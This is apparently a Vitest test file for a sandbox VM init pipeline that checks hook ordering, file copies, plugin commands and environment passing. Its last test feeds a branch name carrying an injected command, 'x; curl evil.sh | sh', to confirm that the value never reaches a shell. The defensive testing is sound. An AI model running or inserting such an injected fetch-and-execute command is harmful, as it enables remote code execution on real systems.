import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { type VMExec, runForkInitHooks, runInitPipeline } from './run-init.js';

interface RecordedCall {
  kind: 'push' | 'run';
  /** push: localDir; run: argv joined */
  arg: string;
  /** run only */
  user?: 'root' | 'default' | undefined;
  /** run only */
  cwd?: string | undefined;
  /** run only */
  env?: Record<string, string> | undefined;
}

function makeFakeExec(): {
  exec: VMExec;
  calls: RecordedCall[];
} {
  const calls: RecordedCall[] = [];
  const exec: VMExec = {
    pushDir: (localDir, dest) => {
      calls.push({ kind: 'push', arg: `${localDir} -> ${dest}` });
      return Promise.resolve();
    },
    pushFile: (localFile, vmAbsPath) => {
      calls.push({ kind: 'push', arg: `file ${localFile} -> ${vmAbsPath}` });
      return Promise.resolve();
    },
    run: ({ user, argv, cwd, env }) => {
      calls.push({ kind: 'run', arg: argv.join(' '), user, cwd, env });
      return Promise.resolve();
    },
  };
  return { exec, calls };
}

describe('runInitPipeline', () => {
  let workdir: string;

  beforeEach(async () => {
    workdir = await fs.mkdtemp(path.join(os.tmpdir(), 'aurica-init-test-'));
  });

  afterEach(async () => {
    await fs.rm(workdir, { recursive: true, force: true });
  });

  it('runs only the built-in step when no hooks are configured', async () => {
    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\necho hi',
      userInitDir: null,
      projectInitDir: null,
    });
    const runs = calls.filter((c) => c.kind === 'run');
    expect(runs.map((r) => r.arg)).toEqual([
      'bash /home/sandbox/.aurica-init-staging/builtin/builtin.sh',
      'rm -rf /home/sandbox/.aurica-init-staging',
    ]);
    expect(runs[0]?.user).toBe('root');
  });

  it('skips a hook layer entirely when its dir is null', async () => {
    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: null,
      projectInitDir: null,
    });
    const userOrProjectPushes = calls.filter(
      (c) => c.kind === 'push' && /staging\/(user|project)$/.test(c.arg),
    );
    expect(userOrProjectPushes).toHaveLength(0);
  });

  it('skips a hook layer when neither setup script is present', async () => {
    const dir = path.join(workdir, 'empty-init');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'README.md'), 'not a setup script');

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: dir,
      projectInitDir: null,
    });
    const userPushes = calls.filter(
      (c) =>
        c.kind === 'push' && c.arg.includes('-> .aurica-init-staging/user'),
    );
    expect(userPushes).toHaveLength(0);
  });

  it('runs only setup-root.sh when setup-user.sh is missing', async () => {
    const dir = path.join(workdir, 'init-root-only');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-root.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: dir,
      projectInitDir: null,
    });
    const layerRuns = calls.filter(
      (c) => c.kind === 'run' && c.arg.includes('staging/user'),
    );
    expect(layerRuns).toHaveLength(1);
    expect(layerRuns[0]?.user).toBe('root');
    expect(layerRuns[0]?.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-root.sh',
    );
  });

  it('runs both layers in built-in -> user -> project order', async () => {
    const userDir = path.join(workdir, 'user-init');
    const projectDir = path.join(workdir, 'project-init');
    await fs.mkdir(userDir);
    await fs.mkdir(projectDir);
    await fs.writeFile(path.join(userDir, 'setup-user.sh'), '#!/bin/bash\n:');
    await fs.writeFile(
      path.join(projectDir, 'setup-root.sh'),
      '#!/bin/bash\n:',
    );

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: userDir,
      projectInitDir: projectDir,
    });

    const order = calls
      .filter((c) => c.kind === 'run')
      .map((c) => c.arg)
      .filter((arg) => arg.startsWith('bash '));

    expect(order).toEqual([
      'bash /home/sandbox/.aurica-init-staging/builtin/builtin.sh',
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-user.sh',
      'bash -l /home/sandbox/.aurica-init-staging/project/setup-root.sh',
    ]);
  });

  it('runs fileCopies after built-in but before plugin commands', async () => {
    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: null,
      projectInitDir: null,
      fileCopies: [
        { absSrc: '/host/.env', isFile: true, dest: '.env' },
        {
          absSrc: '/host/skills',
          isFile: false,
          dest: '~/.claude/skills',
        },
      ],
      pluginCommands: [
        { user: 'root', argv: ['apt-get', 'install', '-y', 'jq'] },
      ],
    });

    const ordered = calls.map((c) => `${c.kind}:${c.arg}`);
    const builtinIdx = ordered.findIndex((s) =>
      s.includes('builtin/builtin.sh'),
    );
    const fileCopyIdx = ordered.findIndex((s) =>
      s.includes('file /host/.env -> /workspaces/.env'),
    );
    const dirCopyIdx = ordered.findIndex((s) =>
      s.includes('/host/skills -> /home/sandbox/.claude/skills'),
    );
    const pluginIdx = ordered.findIndex((s) =>
      s.includes('apt-get install -y jq'),
    );
    expect(builtinIdx).toBeGreaterThanOrEqual(0);
    expect(fileCopyIdx).toBeGreaterThan(builtinIdx);
    expect(dirCopyIdx).toBeGreaterThan(fileCopyIdx);
    expect(pluginIdx).toBeGreaterThan(dirCopyIdx);
  });

  it('uses projectInitCwdOverride as the base for relative file dests', async () => {
    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: null,
      projectInitDir: null,
      projectInitCwdOverride: '/workspaces/repo',
      fileCopies: [{ absSrc: '/host/.env', isFile: true, dest: '.env' }],
    });
    const fileCopy = calls.find(
      (c) => c.kind === 'push' && c.arg.startsWith('file '),
    );
    expect(fileCopy?.arg).toBe('file /host/.env -> /workspaces/repo/.env');
  });

  it('applies pluginCommands after built-in with the requested user', async () => {
    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: null,
      projectInitDir: null,
      pluginCommands: [
        {
          user: 'default',
          argv: [
            'git',
            'config',
            '--global',
            'http.https://github.com/foo/bar.extraHeader',
            'Authorization: Bearer __AURICA_TOKEN_TEST__',
          ],
        },
        {
          user: 'root',
          argv: ['apt-get', 'install', '-y', 'jq'],
        },
      ],
    });
    const runs = calls.filter((c) => c.kind === 'run');
    const headerCmd = runs.find((c) =>
      c.arg.startsWith('git config --global http.https://github.com/foo/bar'),
    );
    const aptCmd = runs.find((c) => c.arg === 'apt-get install -y jq');
    expect(headerCmd?.user).toBe('default');
    expect(aptCmd?.user).toBe('root');
  });

  it('runs setup-user.sh as a login bash invocation regardless of projectInitCwdOverride', async () => {
    const dir = path.join(workdir, 'init-user-bare');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-user.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: dir,
      projectInitDir: null,
      // Set even though there is no setup-project.sh — must not affect
      // setup-user.sh, which stays at the default $HOME cwd.
      projectInitCwdOverride: '/workspaces/bar',
    });

    const runs = calls.filter((c) => c.kind === 'run');
    const userHook = runs.find((c) => c.arg.includes('setup-user.sh'));
    expect(userHook?.user).toBe('default');
    expect(userHook?.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-user.sh',
    );
  });

  it('runs setup-project.sh in the project cwd when projectInitCwdOverride is provided', async () => {
    const dir = path.join(workdir, 'init-project-hook');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-project.sh'), '#!/bin/bash\n:');
    await fs.writeFile(path.join(dir, 'setup-user.sh'), '#!/bin/bash\n:');
    await fs.writeFile(path.join(dir, 'setup-root.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: dir,
      projectInitDir: null,
      projectInitCwdOverride: '/workspaces/bar',
    });

    const runs = calls.filter((c) => c.kind === 'run');
    const projectHook = runs.find((c) => c.arg.includes('setup-project.sh'));
    if (!projectHook) throw new Error('expected setup-project.sh run');
    expect(projectHook.user).toBe('default');
    // Provider runs the script directly with cwd set via the `run.cwd`
    // option (orbctl `-w`). No `bash -c` wrapper and no `env` prefix —
    // project env vars come from /etc/environment.
    expect(projectHook.cwd).toBe('/workspaces/bar');
    // `bash -l` (login shell) so /etc/profile + ~/.profile chain in,
    // sourcing ~/.bashrc and the mise activate snippet — hooks see
    // mise-managed tools on PATH.
    expect(projectHook.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-project.sh',
    );

    // setup-root.sh / setup-user.sh are unchanged by the project context.
    const rootHook = runs.find((c) => c.arg.includes('setup-root.sh'));
    expect(rootHook?.user).toBe('root');
    expect(rootHook?.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-root.sh',
    );
    const userHook = runs.find((c) => c.arg.includes('setup-user.sh'));
    expect(userHook?.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-user.sh',
    );
  });

  it('runs setup-project.sh in /workspaces when no projectInitCwdOverride is provided', async () => {
    const dir = path.join(workdir, 'init-project-default-cwd');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-project.sh'), '#!/bin/bash\n:');
    await fs.writeFile(path.join(dir, 'setup-user.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runInitPipeline(exec, {
      user: 'sandbox',
      builtinScript: '#!/bin/bash\n:',
      userInitDir: dir,
      projectInitDir: null,
    });

    const runs = calls.filter((c) => c.kind === 'run');
    const projectHook = runs.find((c) => c.arg.includes('setup-project.sh'));
    if (!projectHook) throw new Error('expected setup-project.sh run');
    expect(projectHook.user).toBe('default');
    expect(projectHook.cwd).toBe('/workspaces');
    expect(projectHook.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user/setup-project.sh',
    );
    expect(runs.some((c) => c.arg.includes('setup-user.sh'))).toBe(true);
  });

  it('aborts on first non-zero exit', async () => {
    const calls: RecordedCall[] = [];
    let runCount = 0;
    const exec: VMExec = {
      pushDir: () => {
        calls.push({ kind: 'push', arg: '' });
        return Promise.resolve();
      },
      pushFile: () => {
        calls.push({ kind: 'push', arg: '' });
        return Promise.resolve();
      },
      run: ({ argv }) => {
        runCount += 1;
        calls.push({ kind: 'run', arg: argv.join(' ') });
        if (runCount === 1) return Promise.reject(new Error('boom'));
        return Promise.resolve();
      },
    };

    await expect(
      runInitPipeline(exec, {
        user: 'sandbox',
        builtinScript: '#!/bin/bash\n:',
        userInitDir: null,
        projectInitDir: null,
      }),
    ).rejects.toThrow('boom');

    // Only the first run was attempted; cleanup wasn't reached.
    expect(runCount).toBe(1);
  });
});

describe('runForkInitHooks', () => {
  let workdir: string;

  beforeEach(async () => {
    workdir = await fs.mkdtemp(path.join(os.tmpdir(), 'aurica-fork-test-'));
  });

  afterEach(async () => {
    await fs.rm(workdir, { recursive: true, force: true });
  });

  const baseOpts = {
    user: 'sandbox',
    forkName: 'proj-fork-1',
    primaryName: 'proj',
    branch: 'feature-x',
    concurrencyIndex: 2,
  };

  it('does nothing when both hook dirs are null', async () => {
    const { exec, calls } = makeFakeExec();
    await runForkInitHooks(exec, {
      ...baseOpts,
      userInitDir: null,
      projectInitDir: null,
    });
    // Only the best-effort staging cleanup runs.
    const runs = calls.filter((c) => c.kind === 'run');
    expect(runs).toHaveLength(1);
    expect(runs[0]?.arg).toBe('rm -rf /home/sandbox/.aurica-init-staging');
  });

  it('skips a layer whose dir lacks setup-fork.sh', async () => {
    const dir = path.join(workdir, 'no-fork-hook');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-user.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runForkInitHooks(exec, {
      ...baseOpts,
      userInitDir: dir,
      projectInitDir: null,
    });
    expect(calls.some((c) => c.arg.includes('setup-fork.sh'))).toBe(false);
  });

  it('runs setup-fork.sh for user then project layer in order', async () => {
    const userDir = path.join(workdir, 'user-fork');
    const projectDir = path.join(workdir, 'project-fork');
    await fs.mkdir(userDir);
    await fs.mkdir(projectDir);
    await fs.writeFile(path.join(userDir, 'setup-fork.sh'), '#!/bin/bash\n:');
    await fs.writeFile(
      path.join(projectDir, 'setup-fork.sh'),
      '#!/bin/bash\n:',
    );

    const { exec, calls } = makeFakeExec();
    await runForkInitHooks(exec, {
      ...baseOpts,
      userInitDir: userDir,
      projectInitDir: projectDir,
    });

    const hookRuns = calls
      .filter((c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'))
      .map((c) => c.arg);
    expect(hookRuns).toEqual([
      'bash -l /home/sandbox/.aurica-init-staging/user-fork/setup-fork.sh',
      'bash -l /home/sandbox/.aurica-init-staging/project-fork/setup-fork.sh',
    ]);
  });

  it('injects fork env via the run env channel, not a shell prefix', async () => {
    const dir = path.join(workdir, 'env-fork');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-fork.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runForkInitHooks(exec, {
      ...baseOpts,
      userInitDir: dir,
      projectInitDir: null,
    });

    const hook = calls.find(
      (c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'),
    );
    if (!hook) throw new Error('expected setup-fork.sh run');
    expect(hook.user).toBe('default');
    // argv is the bare script invocation — no `bash -c`, no `K=V` prefix.
    expect(hook.arg).toBe(
      'bash -l /home/sandbox/.aurica-init-staging/user-fork/setup-fork.sh',
    );
    expect(hook.env).toEqual({
      FORK_NAME: 'proj-fork-1',
      PRIMARY_NAME: 'proj',
      FORK_BRANCH: 'feature-x',
      CONCURRENCY_INDEX: '2',
    });
  });

  it('does not let a malicious branch value escape into a shell command', async () => {
    const dir = path.join(workdir, 'inject-fork');
    await fs.mkdir(dir);
    await fs.writeFile(path.join(dir, 'setup-fork.sh'), '#!/bin/bash\n:');

    const { exec, calls } = makeFakeExec();
    await runForkInitHooks(exec, {
      ...baseOpts,
      branch: 'x; curl evil.sh | sh',
      userInitDir: dir,
      projectInitDir: null,
    });

    const hook = calls.find(
      (c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'),
    );
    if (!hook) throw new Error('expected setup-fork.sh run');
    // The malicious value stays confined to the env value — never the argv,
    // which is passed token-by-token to execa with no shell.
    expect(hook.arg).not.toContain('curl');
    expect(hook.arg).not.toContain(';');
    expect(hook.env?.FORK_BRANCH).toBe('x; curl evil.sh | sh');
  });
});
